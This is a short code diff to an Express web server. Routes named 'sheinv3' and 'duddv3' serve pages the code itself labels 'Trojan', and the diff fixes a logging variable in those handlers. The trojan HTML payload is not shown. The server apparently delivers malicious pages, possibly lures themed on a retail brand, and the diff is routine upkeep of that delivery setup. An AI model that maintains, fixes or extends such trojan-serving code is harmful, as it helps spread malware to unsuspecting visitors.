@@ -997,7 +997,7 @@ app.get('/sheinv3/:slug', (req, res, next) => {
         </html>
             `;
             res.send(trojanHTML);
-     console.log(`Served sheinv3 Trojan (${s1})`);
+     console.log(`Served sheinv3 Trojan (${slug})`);
 });
 
 
@@ -1121,7 +1121,7 @@ app.get('/duddv3/:slug', (req, res, next) => {
         </html>
             `;
             res.send(trojanHTML);
-     console.log(`Served duddv3 Trojan (${s1})`);
+     console.log(`Served duddv3 Trojan (${slug})`);
 });
 
 
